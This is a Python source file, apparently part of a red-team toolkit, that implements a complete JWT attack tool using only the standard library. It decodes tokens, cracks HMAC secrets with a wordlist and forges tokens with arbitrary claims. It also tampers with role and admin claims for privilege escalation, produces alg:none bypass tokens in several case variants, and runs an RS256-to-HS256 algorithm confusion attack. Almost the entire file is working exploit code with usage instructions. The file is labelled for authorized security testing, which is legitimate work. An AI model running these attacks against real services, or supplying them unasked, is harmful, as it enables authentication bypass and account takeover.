#!/usr/bin/env python3
"""
JWT Security Testing Toolkit
AI-RedTeam-Toolkit | Authorized Security Testing Only

Features:
  - Decode JWT header + payload without verification
  - Brute-force HS256 secret using a wordlist
  - Forge new JWTs with custom claims and secret
  - Algorithm confusion attack (RS256 -> HS256)
  - Claim tampering (role, sub, exp, admin, etc.)
  - None algorithm bypass
  - Expiration analysis and modification

Usage:
  python3 jwt-toolkit.py decode <token>
  python3 jwt-toolkit.py crack <token> --wordlist <file>
  python3 jwt-toolkit.py forge --secret <key> --claims '{"sub":"admin"}'
  python3 jwt-toolkit.py tamper <token> --set role=admin --set admin=true
  python3 jwt-toolkit.py none <token>

No external dependencies required - stdlib only.
"""

import argparse
import base64
import hashlib
import hmac
import json
import struct
import sys
import time
from typing import Optional

# ──────────────────────────────────────────────────────────────────────────────
# Constants and colors
# ──────────────────────────────────────────────────────────────────────────────

VERSION = "1.0.0"

BANNER = r"""
     ╦╦ ╦╔╦╗  ╔╦╗┌─┐┌─┐┬  ┬┌─┬┌┬┐
     ║║║║ ║    ║ │ ││ ││  ├┴┐│ │
    ╚╝╚╩╝ ╩    ╩ └─┘└─┘┴─┘┴ ┴┴ ┴
    AI-RedTeam-Toolkit | JWT Security Tester v{version}
    ─────────────────────────────────────────────
""".format(version=VERSION)


class Color:
    """ANSI color codes for terminal output."""

    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"

    @classmethod
    def disable(cls):
        """Disable all colors (for non-TTY or --no-color)."""
        for attr in ["RESET", "BOLD", "RED", "GREEN", "YELLOW", "BLUE", "MAGENTA", "CYAN", "GRAY"]:
            setattr(cls, attr, "")


# ──────────────────────────────────────────────────────────────────────────────
# Base64 helpers
# ──────────────────────────────────────────────────────────────────────────────


def b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(s: str) -> bytes:
    """Base64url decode with padding restoration."""
    s = s.replace("-", "+").replace("_", "/")
    # Restore padding
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    try:
        return base64.b64decode(s)
    except Exception as e:
        raise ValueError(f"Invalid base64url encoding: {e}")


# ──────────────────────────────────────────────────────────────────────────────
# JWT core functions
# ──────────────────────────────────────────────────────────────────────────────


def split_token(token: str) -> tuple:
    """Split a JWT into its parts. Returns (header_b64, payload_b64, signature_b64)."""
    token = token.strip()
    parts = token.split(".")
    if len(parts) == 3:
        return parts[0], parts[1], parts[2]
    elif len(parts) == 2:
        # Token without signature (alg:none)
        return parts[0], parts[1], ""
    else:
        raise ValueError(f"Invalid JWT format: expected 2-3 parts separated by '.', got {len(parts)}")


def decode_part(b64_str: str) -> dict:
    """Decode a base64url-encoded JWT part into a dict."""
    raw = b64url_decode(b64_str)
    return json.loads(raw)


def decode_token(token: str) -> tuple:
    """Decode a JWT and return (header_dict, payload_dict, signature_bytes)."""
    header_b64, payload_b64, sig_b64 = split_token(token)
    header = decode_part(header_b64)
    payload = decode_part(payload_b64)
    signature = b64url_decode(sig_b64) if sig_b64 else b""
    return header, payload, signature


def sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    """Create HMAC-SHA256 signature for a JWT."""
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return b64url_encode(sig)


def sign_hs384(header_b64: str, payload_b64: str, secret: str) -> str:
    """Create HMAC-SHA384 signature for a JWT."""
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha384).digest()
    return b64url_encode(sig)


def sign_hs512(header_b64: str, payload_b64: str, secret: str) -> str:
    """Create HMAC-SHA512 signature for a JWT."""
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha512).digest()
    return b64url_encode(sig)


SIGNERS = {
    "HS256": sign_hs256,
    "HS384": sign_hs384,
    "HS512": sign_hs512,
}


def build_token(header: dict, payload: dict, secret: Optional[str] = None) -> str:
    """Build a complete JWT from header, payload, and optional secret."""
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    alg = header.get("alg", "none")

    if alg == "none" or alg == "None" or alg == "NONE" or alg == "nOnE":
        return f"{header_b64}.{payload_b64}."
    elif alg in SIGNERS:
        if not secret:
            raise ValueError(f"Secret required for {alg} algorithm")
        sig = SIGNERS[alg](header_b64, payload_b64, secret)
        return f"{header_b64}.{payload_b64}.{sig}"
    else:
        raise ValueError(f"Unsupported algorithm for signing: {alg}")


def verify_hs256(token: str, secret: str) -> bool:
    """Verify an HS256 JWT signature against a secret."""
    header_b64, payload_b64, sig_b64 = split_token(token)
    expected_sig = sign_hs256(header_b64, payload_b64, secret)
    return hmac.compare_digest(sig_b64, expected_sig)


# ──────────────────────────────────────────────────────────────────────────────
# Time helpers
# ──────────────────────────────────────────────────────────────────────────────


def format_timestamp(ts: int) -> str:
    """Format a Unix timestamp to human-readable UTC string."""
    try:
        return time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(ts))
    except (OSError, ValueError, OverflowError):
        return f"<invalid timestamp: {ts}>"


def check_expiration(payload: dict) -> dict:
    """Check token expiration status. Returns info dict."""
    now = int(time.time())
    result = {"current_time": now, "current_time_utc": format_timestamp(now)}

    if "exp" in payload:
        exp = int(payload["exp"])
        result["exp"] = exp
        result["exp_utc"] = format_timestamp(exp)
        result["expired"] = now > exp
        if now > exp:
            result["expired_ago_seconds"] = now - exp
        else:
            result["expires_in_seconds"] = exp - now
    else:
        result["exp"] = None
        result["expired"] = False
        result["note"] = "No 'exp' claim present - token does not expire"

    if "iat" in payload:
        iat = int(payload["iat"])
        result["iat"] = iat
        result["iat_utc"] = format_timestamp(iat)
        result["token_age_seconds"] = now - iat

    if "nbf" in payload:
        nbf = int(payload["nbf"])
        result["nbf"] = nbf
        result["nbf_utc"] = format_timestamp(nbf)
        result["not_before_reached"] = now >= nbf

    return result


# ──────────────────────────────────────────────────────────────────────────────
# Command: decode
# ──────────────────────────────────────────────────────────────────────────────


def cmd_decode(args):
    """Decode and display JWT contents."""
    token = args.token.strip()

    try:
        header, payload, signature = decode_token(token)
    except Exception as e:
        print(f"{Color.RED}[!] Failed to decode token: {e}{Color.RESET}")
        return 1

    if args.json:
        result = {
            "header": header,
            "payload": payload,
            "signature_present": bool(signature),
            "expiration": check_expiration(payload),
        }
        print(json.dumps(result, indent=2))
        return 0

    print(f"\n{Color.CYAN}[*] JWT Decode Results{Color.RESET}")
    print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")

    # Header
    print(f"\n{Color.YELLOW}{Color.BOLD}Header:{Color.RESET}")
    print(f"  Algorithm : {Color.GREEN}{header.get('alg', 'N/A')}{Color.RESET}")
    print(f"  Type      : {header.get('typ', 'N/A')}")
    if "kid" in header:
        print(f"  Key ID    : {header['kid']}")
    if "jku" in header:
        print(f"  JWK URL   : {Color.RED}{header['jku']}{Color.RESET}  (potential SSRF vector)")
    if "x5u" in header:
        print(f"  X.509 URL : {Color.RED}{header['x5u']}{Color.RESET}  (potential SSRF vector)")
    extra_header = {k: v for k, v in header.items() if k not in ("alg", "typ", "kid", "jku", "x5u")}
    if extra_header:
        for k, v in extra_header.items():
            print(f"  {k:10s}: {v}")

    # Payload
    print(f"\n{Color.YELLOW}{Color.BOLD}Payload:{Color.RESET}")
    for key, value in payload.items():
        display_val = value
        note = ""
        if key in ("exp", "iat", "nbf") and isinstance(value, (int, float)):
            display_val = f"{value}  ({format_timestamp(int(value))})"
        if key == "exp":
            now = int(time.time())
            if isinstance(value, (int, float)) and now > int(value):
                note = f"  {Color.RED}[EXPIRED]{Color.RESET}"
            elif isinstance(value, (int, float)):
                remaining = int(value) - now
                note = f"  {Color.GREEN}[valid for {remaining}s]{Color.RESET}"
        print(f"  {key:10s}: {display_val}{note}")

    # Signature
    print(f"\n{Color.YELLOW}{Color.BOLD}Signature:{Color.RESET}")
    if signature:
        print(f"  Present   : {Color.GREEN}Yes{Color.RESET} ({len(signature)} bytes)")
    else:
        print(f"  Present   : {Color.RED}No (empty/none){Color.RESET}")

    # Security notes
    alg = header.get("alg", "")
    print(f"\n{Color.YELLOW}{Color.BOLD}Security Notes:{Color.RESET}")
    if alg.lower() == "none":
        print(f"  {Color.RED}[!] Algorithm is 'none' - signature not verified{Color.RESET}")
    if alg == "HS256":
        print(f"  {Color.BLUE}[i] HS256 - symmetric key; try cracking with 'crack' command{Color.RESET}")
    if alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
        print(f"  {Color.BLUE}[i] {alg} - asymmetric; test algorithm confusion attack{Color.RESET}")
    if "admin" in payload:
        print(f"  {Color.YELLOW}[!] 'admin' claim found - try tampering{Color.RESET}")
    if "role" in payload:
        print(f"  {Color.YELLOW}[!] 'role' claim found (value: {payload['role']}) - try privilege escalation{Color.RESET}")

    print()
    return 0


# ──────────────────────────────────────────────────────────────────────────────
# Command: crack
# ──────────────────────────────────────────────────────────────────────────────


def cmd_crack(args):
    """Brute-force HS256 JWT secret using a wordlist."""
    token = args.token.strip()

    try:
        header, payload, signature = decode_token(token)
    except Exception as e:
        print(f"{Color.RED}[!] Failed to decode token: {e}{Color.RESET}")
        return 1

    alg = header.get("alg", "")
    if alg not in ("HS256", "HS384", "HS512"):
        print(f"{Color.YELLOW}[!] Token uses '{alg}' algorithm. Cracking works best with HS256/HS384/HS512.{Color.RESET}")
        if not args.force:
            print(f"{Color.YELLOW}    Use --force to attempt anyway (will test as HS256).{Color.RESET}")
            return 1

    try:
        with open(args.wordlist, "r", errors="replace") as f:
            words = f.read().splitlines()
    except FileNotFoundError:
        print(f"{Color.RED}[!] Wordlist not found: {args.wordlist}{Color.RESET}")
        return 1
    except Exception as e:
        print(f"{Color.RED}[!] Error reading wordlist: {e}{Color.RESET}")
        return 1

    total = len(words)
    if not args.json:
        print(f"\n{Color.CYAN}[*] JWT Secret Cracker{Color.RESET}")
        print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")
        print(f"  Algorithm  : {alg or 'HS256 (forced)'}")
        print(f"  Wordlist   : {args.wordlist}")
        print(f"  Candidates : {total:,}")
        print(f"\n{Color.YELLOW}[*] Cracking...{Color.RESET}")

    header_b64, payload_b64, sig_b64 = split_token(token)
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")

    # Select hash algorithm
    if alg == "HS384":
        hash_func = hashlib.sha384
    elif alg == "HS512":
        hash_func = hashlib.sha512
    else:
        hash_func = hashlib.sha256

    start_time = time.time()
    found_secret = None

    for i, word in enumerate(words):
        word = word.strip()
        if not word:
            continue

        sig = hmac.new(word.encode("utf-8"), signing_input, hash_func).digest()
        candidate_sig = b64url_encode(sig)

        if hmac.compare_digest(candidate_sig, sig_b64):
            found_secret = word
            break

        # Progress indicator every 10000 attempts
        if not args.json and (i + 1) % 10000 == 0:
            elapsed = time.time() - start_time
            rate = (i + 1) / elapsed if elapsed > 0 else 0
            print(f"  {Color.GRAY}[{i + 1:,}/{total:,}] {rate:,.0f} attempts/sec{Color.RESET}", end="\r")

    elapsed = time.time() - start_time

    if args.json:
        result = {
            "cracked": found_secret is not None,
            "secret": found_secret,
            "attempts": i + 1,
            "elapsed_seconds": round(elapsed, 2),
            "rate_per_second": round((i + 1) / elapsed, 0) if elapsed > 0 else 0,
        }
        print(json.dumps(result, indent=2))
    else:
        print(" " * 80, end="\r")  # Clear progress line
        if found_secret:
            print(f"\n  {Color.GREEN}{Color.BOLD}[+] SECRET FOUND!{Color.RESET}")
            print(f"  {Color.GREEN}Secret : {found_secret}{Color.RESET}")
            print(f"  Attempts: {i + 1:,} in {elapsed:.2f}s")

            # Show forged token example
            print(f"\n  {Color.BLUE}[i] You can now forge tokens:{Color.RESET}")
            print(f"  python3 jwt-toolkit.py forge --secret '{found_secret}' --claims '<your-claims>'")
        else:
            print(f"\n  {Color.RED}[-] Secret not found in wordlist{Color.RESET}")
            print(f"  Tried {total:,} candidates in {elapsed:.2f}s")
        print()

    return 0 if found_secret else 1


# ──────────────────────────────────────────────────────────────────────────────
# Command: forge
# ──────────────────────────────────────────────────────────────────────────────


def cmd_forge(args):
    """Forge a new JWT with custom claims."""
    # Parse claims
    try:
        claims = json.loads(args.claims)
    except json.JSONDecodeError as e:
        print(f"{Color.RED}[!] Invalid JSON claims: {e}{Color.RESET}")
        return 1

    alg = args.algorithm or "HS256"

    # Build header
    header = {"alg": alg, "typ": "JWT"}

    # Handle time claims
    now = int(time.time())
    if args.exp:
        if args.exp.startswith("+"):
            claims["exp"] = now + int(args.exp[1:])
        else:
            claims["exp"] = int(args.exp)
    if "iat" not in claims:
        claims["iat"] = now

    secret = args.secret

    if not args.json:
        print(f"\n{Color.CYAN}[*] JWT Forge{Color.RESET}")
        print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")
        print(f"  Algorithm : {alg}")
        print(f"  Claims    : {json.dumps(claims, indent=2)}")

    try:
        token = build_token(header, claims, secret)
    except ValueError as e:
        print(f"{Color.RED}[!] {e}{Color.RESET}")
        return 1

    if args.json:
        result = {
            "token": token,
            "header": header,
            "payload": claims,
            "algorithm": alg,
        }
        print(json.dumps(result, indent=2))
    else:
        print(f"\n  {Color.GREEN}{Color.BOLD}[+] Forged Token:{Color.RESET}")
        print(f"  {token}")
        print()

    return 0


# ──────────────────────────────────────────────────────────────────────────────
# Command: tamper
# ──────────────────────────────────────────────────────────────────────────────


def _parse_value(val_str: str):
    """Parse a value string into appropriate Python type."""
    # Boolean
    if val_str.lower() == "true":
        return True
    if val_str.lower() == "false":
        return False
    if val_str.lower() == "null" or val_str.lower() == "none":
        return None
    # Integer
    try:
        return int(val_str)
    except ValueError:
        pass
    # Float
    try:
        return float(val_str)
    except ValueError:
        pass
    # JSON object/array
    if val_str.startswith("{") or val_str.startswith("["):
        try:
            return json.loads(val_str)
        except json.JSONDecodeError:
            pass
    # String
    return val_str


def cmd_tamper(args):
    """Tamper with JWT claims."""
    token = args.token.strip()

    try:
        header, payload, signature = decode_token(token)
    except Exception as e:
        print(f"{Color.RED}[!] Failed to decode token: {e}{Color.RESET}")
        return 1

    if not args.set and not args.delete and not args.set_header:
        print(f"{Color.RED}[!] No modifications specified. Use --set, --set-header, or --delete{Color.RESET}")
        return 1

    original_payload = dict(payload)
    original_header = dict(header)

    # Apply claim modifications
    if args.set:
        for pair in args.set:
            if "=" not in pair:
                print(f"{Color.RED}[!] Invalid --set format: '{pair}'. Use key=value{Color.RESET}")
                return 1
            key, value = pair.split("=", 1)
            payload[key] = _parse_value(value)

    # Apply header modifications
    if args.set_header:
        for pair in args.set_header:
            if "=" not in pair:
                print(f"{Color.RED}[!] Invalid --set-header format: '{pair}'. Use key=value{Color.RESET}")
                return 1
            key, value = pair.split("=", 1)
            header[key] = _parse_value(value)

    # Delete claims
    if args.delete:
        for key in args.delete:
            payload.pop(key, None)

    # Handle exp modification shortcuts
    if args.extend_exp:
        current_exp = payload.get("exp", int(time.time()))
        payload["exp"] = int(current_exp) + args.extend_exp

    if args.no_exp:
        payload.pop("exp", None)

    # Re-sign if secret provided, otherwise just encode without valid signature
    if args.secret:
        alg = header.get("alg", "HS256")
        try:
            new_token = build_token(header, payload, args.secret)
        except ValueError as e:
            print(f"{Color.RED}[!] {e}{Color.RESET}")
            return 1
    else:
        # Build without valid signature (useful for testing server-side validation)
        header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        # Keep original signature (it will be invalid but some servers don't verify)
        _, _, orig_sig = split_token(token)
        new_token = f"{header_b64}.{payload_b64}.{orig_sig}"

    if args.json:
        result = {
            "original_header": original_header,
            "original_payload": original_payload,
            "tampered_header": header,
            "tampered_payload": payload,
            "token": new_token,
            "signature_valid": args.secret is not None,
        }
        print(json.dumps(result, indent=2))
    else:
        print(f"\n{Color.CYAN}[*] JWT Tamper{Color.RESET}")
        print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")

        # Show changes
        print(f"\n{Color.YELLOW}{Color.BOLD}Changes:{Color.RESET}")
        all_keys = set(list(original_payload.keys()) + list(payload.keys()))
        for key in sorted(all_keys):
            old_val = original_payload.get(key, "<not set>")
            new_val = payload.get(key, "<deleted>")
            if old_val != new_val:
                print(f"  {key}: {Color.RED}{old_val}{Color.RESET} -> {Color.GREEN}{new_val}{Color.RESET}")

        # Show header changes
        all_hkeys = set(list(original_header.keys()) + list(header.keys()))
        for key in sorted(all_hkeys):
            old_val = original_header.get(key, "<not set>")
            new_val = header.get(key, "<deleted>")
            if old_val != new_val:
                print(f"  [header] {key}: {Color.RED}{old_val}{Color.RESET} -> {Color.GREEN}{new_val}{Color.RESET}")

        if args.secret:
            print(f"\n  {Color.GREEN}[+] Token re-signed with provided secret{Color.RESET}")
        else:
            print(f"\n  {Color.YELLOW}[!] Token NOT re-signed (original signature kept){Color.RESET}")
            print(f"  {Color.YELLOW}    Use --secret <key> to re-sign{Color.RESET}")

        print(f"\n  {Color.GREEN}{Color.BOLD}[+] Tampered Token:{Color.RESET}")
        print(f"  {new_token}")
        print()

    return 0


# ──────────────────────────────────────────────────────────────────────────────
# Command: none
# ──────────────────────────────────────────────────────────────────────────────


def cmd_none(args):
    """Generate alg:none bypass tokens."""
    token = args.token.strip()

    try:
        header, payload, signature = decode_token(token)
    except Exception as e:
        print(f"{Color.RED}[!] Failed to decode token: {e}{Color.RESET}")
        return 1

    # Generate multiple none-algorithm variants
    none_variants = ["none", "None", "NONE", "nOnE"]
    tokens = {}

    for variant in none_variants:
        h = dict(header)
        h["alg"] = variant
        header_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

        # Variant 1: empty signature
        tokens[f"{variant}_empty"] = f"{header_b64}.{payload_b64}."
        # Variant 2: no trailing dot
        tokens[f"{variant}_nodot"] = f"{header_b64}.{payload_b64}"

    if args.json:
        result = {
            "original_algorithm": header.get("alg", "unknown"),
            "payload": payload,
            "none_tokens": tokens,
        }
        print(json.dumps(result, indent=2))
    else:
        print(f"\n{Color.CYAN}[*] Algorithm 'none' Bypass{Color.RESET}")
        print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")
        print(f"  Original alg: {header.get('alg', 'unknown')}")
        print(f"\n{Color.YELLOW}{Color.BOLD}Generated Tokens:{Color.RESET}")

        for name, tok in tokens.items():
            variant_name = name.replace("_empty", " (empty sig)").replace("_nodot", " (no trailing dot)")
            print(f"\n  {Color.GREEN}[{variant_name}]{Color.RESET}")
            print(f"  {tok}")

        print(f"\n{Color.BLUE}[i] Test each variant against the target.{Color.RESET}")
        print(f"{Color.BLUE}    Some JWT libraries accept 'none' with case variations.{Color.RESET}")
        print()

    return 0


# ──────────────────────────────────────────────────────────────────────────────
# Command: confusion (algorithm confusion attack)
# ──────────────────────────────────────────────────────────────────────────────


def cmd_confusion(args):
    """Test RS256 to HS256 algorithm confusion attack.

    In this attack, an RS256 token is re-signed as HS256 using the public key
    as the HMAC secret. If the server uses the same key variable for both
    verification paths, it will verify the HMAC using the public key bytes.
    """
    token = args.token.strip()

    try:
        header, payload, signature = decode_token(token)
    except Exception as e:
        print(f"{Color.RED}[!] Failed to decode token: {e}{Color.RESET}")
        return 1

    if not args.public_key:
        print(f"{Color.RED}[!] --public-key is required for algorithm confusion attack{Color.RESET}")
        return 1

    # Read public key
    try:
        with open(args.public_key, "r") as f:
            pubkey_data = f.read()
    except FileNotFoundError:
        print(f"{Color.RED}[!] Public key file not found: {args.public_key}{Color.RESET}")
        return 1

    original_alg = header.get("alg", "unknown")

    # Create HS256 token signed with the public key as secret
    new_header = dict(header)
    new_header["alg"] = "HS256"

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    # Sign with public key bytes as HMAC secret
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(pubkey_data.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)

    confused_token = f"{header_b64}.{payload_b64}.{sig_b64}"

    if args.json:
        result = {
            "attack": "algorithm_confusion",
            "original_algorithm": original_alg,
            "new_algorithm": "HS256",
            "public_key_file": args.public_key,
            "token": confused_token,
            "payload": payload,
        }
        print(json.dumps(result, indent=2))
    else:
        print(f"\n{Color.CYAN}[*] Algorithm Confusion Attack (RS256 -> HS256){Color.RESET}")
        print(f"{Color.GRAY}{'─' * 60}{Color.RESET}")
        print(f"  Original alg : {original_alg}")
        print(f"  New alg      : HS256")
        print(f"  Public key   : {args.public_key}")
        print(f"\n  {Color.YELLOW}[!] Attack: signing HS256 with the RSA public key as HMAC secret{Color.RESET}")
        print(f"  {Color.YELLOW}    Works when server uses same key variable for RS256 and HS256{Color.RESET}")
        print(f"\n  {Color.GREEN}{Color.BOLD}[+] Confused Token:{Color.RESET}")
        print(f"  {confused_token}")
        print()

    return 0


# ──────────────────────────────────────────────────────────────────────────────
# Argument parser
# ──────────────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    # Common parent with global flags so they work both before and after subcommand
    global_parent = argparse.ArgumentParser(add_help=False)
    global_parent.add_argument("--no-color", action="store_true", help="Disable colored output")
    global_parent.add_argument("--no-banner", action="store_true", help="Suppress banner")
    global_parent.add_argument("--json", action="store_true", help="Output results as JSON")

    parser = argparse.ArgumentParser(
        prog="jwt-toolkit",
        description="JWT Security Testing Toolkit - AI-RedTeam-Toolkit",
        epilog="For authorized security testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        parents=[global_parent],
    )

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # ── decode ────────────────────────────────────────────────────────────
    p_decode = subparsers.add_parser("decode", help="Decode JWT header and payload", parents=[global_parent])
    p_decode.add_argument("token", help="JWT token to decode")

    # ── crack ─────────────────────────────────────────────────────────────
    p_crack = subparsers.add_parser("crack", help="Brute-force JWT HMAC secret", parents=[global_parent])
    p_crack.add_argument("token", help="JWT token to crack")
    p_crack.add_argument("--wordlist", "-w", required=True, help="Path to wordlist file")
    p_crack.add_argument("--force", "-f", action="store_true", help="Force cracking even if algorithm is not HMAC")

    # ── forge ─────────────────────────────────────────────────────────────
    p_forge = subparsers.add_parser("forge", help="Forge a new JWT with custom claims", parents=[global_parent])
    p_forge.add_argument("--secret", "-s", required=False, help="Signing secret (required for HMAC algs)")
    p_forge.add_argument("--claims", "-c", required=True, help="JSON claims (e.g. '{\"sub\":\"admin\"}')")
    p_forge.add_argument("--algorithm", "-a", default="HS256", help="Algorithm (default: HS256)")
    p_forge.add_argument("--exp", help="Expiration: Unix timestamp or +seconds (e.g. +3600)")

    # ── tamper ────────────────────────────────────────────────────────────
    p_tamper = subparsers.add_parser("tamper", help="Modify JWT claims", parents=[global_parent])
    p_tamper.add_argument("token", help="JWT token to tamper with")
    p_tamper.add_argument("--set", action="append", metavar="key=value", help="Set a claim (repeatable)")
    p_tamper.add_argument("--set-header", action="append", metavar="key=value", help="Set a header field (repeatable)")
    p_tamper.add_argument("--delete", action="append", metavar="key", help="Delete a claim (repeatable)")
    p_tamper.add_argument("--secret", "-s", help="Re-sign token with this secret")
    p_tamper.add_argument("--extend-exp", type=int, metavar="SECONDS", help="Extend exp by N seconds")
    p_tamper.add_argument("--no-exp", action="store_true", help="Remove expiration claim")

    # ── none ──────────────────────────────────────────────────────────────
    p_none = subparsers.add_parser("none", help="Generate alg:none bypass tokens", parents=[global_parent])
    p_none.add_argument("token", help="JWT token to convert")

    # ── confusion ─────────────────────────────────────────────────────────
    p_confusion = subparsers.add_parser("confusion", help="RS256->HS256 algorithm confusion attack", parents=[global_parent])
    p_confusion.add_argument("token", help="JWT token (RS256)")
    p_confusion.add_argument("--public-key", "-k", required=True, help="Path to RSA public key file")

    return parser


# ──────────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────────

COMMANDS = {
    "decode": cmd_decode,
    "crack": cmd_crack,
    "forge": cmd_forge,
    "tamper": cmd_tamper,
    "none": cmd_none,
    "confusion": cmd_confusion,
}


def main():
    parser = build_parser()
    args = parser.parse_args()

    # Handle color
    if args.no_color or not sys.stdout.isatty():
        Color.disable()

    # Banner
    if not args.no_banner and not args.json:
        print(f"{Color.CYAN}{BANNER}{Color.RESET}")

    if not args.command:
        parser.print_help()
        return 0

    # Merge top-level --json into subcommand
    if hasattr(args, "json") and args.json:
        pass  # already set

    handler = COMMANDS.get(args.command)
    if handler:
        return handler(args)
    else:
        parser.print_help()
        return 1


if __name__ == "__main__":
    sys.exit(main() or 0)
